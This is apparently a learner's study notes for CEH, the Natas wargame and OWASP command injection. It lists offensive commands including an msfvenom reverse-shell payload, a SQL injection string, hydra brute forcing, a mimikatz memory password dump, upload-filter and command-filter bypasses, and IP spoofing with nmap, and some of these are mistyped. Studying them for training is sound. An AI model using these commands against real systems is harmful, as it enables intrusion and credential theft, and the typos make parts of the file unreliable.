# CEH
## Commands tips
use `traceroute` for getting we pass what routers to get to network.
## Websites and application tips
> this [site](https://www.iplocation.net/) says the ip is for where, and this [site](who.is) says who create this website.

> for getting special file type in google add `filetype:[type]` after **website domain** and add `site:` before it.
>
> use `maltego` to get datas from a website.

## ip spoofing
ip spoofing means you stealing ip when some ips have access.
we use **nmap** for scaning ports. use it like this:
```console
nmap [ip address] [option] [port]
```
for example for scaning port 80 in specific ip, do like this
```console
nmap 192.168.1.6 -Pn -p 80
```
for changing ip with nmap do this:
```console
nmap -S [new ip] -Pn -p [port] -e [interface] [ip target]
```
## ICMP
### Ping
ping means ip can you here me?
type **one** *successed*
```console
ping 4.2.2.4
# reply from 4.2.2.4: bytes=32 time=30ms TTL=46
```
type **two** *request timed out*: it means somewhere we have problem but we don't know where
```console
ping 4.2.2.4
# request timed out
```
type **three** *destination host unreachable*: you must focus on ***reply from*** destination after that ip is down but may be
```console
ping 4.2.2.4
# reply from 4.2.2.8: destination host unreachable
```
type **four** *destination net unreachable*: it means you don't have access to that network
```console
ping 4.2.24
# reply from 192.168.1.1: destination net unreachable
```
type **five** *admin prohibited*: means admin says don't give access to you
```console
ping 4.2.2.4
# reply from 4.2.2.8: communication with administer prohibited
```
### msfvenom
**msfvenom** use for making a file to add upload as payload.
```console
msfvenom -p windows/meterpreter/reverce_tcp -f war > file.war
```
in here after `-p` we must add our platform and payload type and after `-f` add format and after `>` name the file.

for changing process you can use `migrate`.
with `python3 -m http.srever [port]` you can make a server in your directory
for social engineering you can use `setoolkit` but remember you must be **root**.
for remoting desktop you must use `seth`. you can clone it from [here](https://github.com/SySS-Research/Seth)
we use `shelter` for put payload in another file.

### sql
for getting username in sql use `' or 1=1;--`
you can use `sqlmap` for checking database

# burt force
check many passwords to get password. we use `hydra`
```console
hydra -l [user] -P [password_list] protocol://ip
```
we have a password list in kali in `/user/share/rockyou.txt/`

with `load kiwi` and then use this code you can get some passwords that's are in ram as a clear text.
```console
kiwi_cmd sekurlsa::logonpasswords
```

for cracking hash, we can use ophcrack. and get the tables of it from its [website](https://ophcrack.sourceforge.io/tables.php)
## Wifi
for attacking wifi we need `airgeddon`. it must run with `sudo`.
## Android
we use `evil-droid` you can get it from [here](https://github.com/M4sc3r4n0/Evil-Droid)

# Natas
1- checking directory of website
2- check the robots.txt
> robots.txt is a file that says to **search engine** to what to do

3- whenever we don't have access except an specific adress we can make link on that adress
4- sometimes you need to change the cookies for example log in
5- with `curl` you can get access to some parts of website
6- you can see a page after `?page=`
7- when we have **command** in codes you can seprate command with `;`
8- with grep you can add -r for searching in directory
> we know grep use regex

9- sometimes you must change some cookies for access
10- if you can upload a file, you can change the format and run what you want...(use burpsuit)
11- magic number is a part of your file that shows what type is it. you can add magic number to  the first of your php file to access to uploading it. you can change magic number with `hexeditor`.
12- with `$()` you can run a new command in a command for example:
```console
echo $(ls)
# it puts ls output here
```
13- for blining sql injection(the that you can't see the result of your query request) you can use `AND sleep(10)` to check that is your query is correct or not. if your query is correct it will sleep 10 second.

# OWASP Top Ten
## os command injection
command injection means you exploit with having problems in os command.
for running to commands in **linux** you can use this methods
```consloe
ping 4.2.2.4; ls -ltrh
#both run
ping 4.2.2.4 && ls -ltrh
#if first one runs other will run
ping 4.2.2.4 || ls -ltrh
#if first command runs, second one won't run, and reverse
pwd | grep rc
#give the result of first command to second command
pwd & grep rc
#first command goes to background job and second one start then first one start again 
```
in **windows**:
```console
dir & whoami
#both run
dir | whoami
#just second one runs
```
### Out of Bond (oob)
for adding the result to a new file we use this sign `>`. if we use `>>` it append in a file that we had it before.

### by passing command injections
on of ways to bypassing is using `', " or \`. for example `p'wd'` or `c"a"t` or `pi\ng`
